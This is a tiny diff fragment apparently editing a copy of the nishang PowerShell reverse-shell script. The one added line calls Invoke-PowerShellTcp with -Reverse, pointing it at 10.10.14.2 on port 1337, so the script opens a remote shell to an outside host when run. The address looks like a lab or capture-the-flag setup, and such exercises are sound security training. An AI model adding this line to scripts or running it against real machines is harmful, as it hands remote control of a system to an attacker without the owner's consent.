@@ -125,3 +125,5 @@ https://github.com/samratashok/nishang
     }
 }
 
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 1337
+
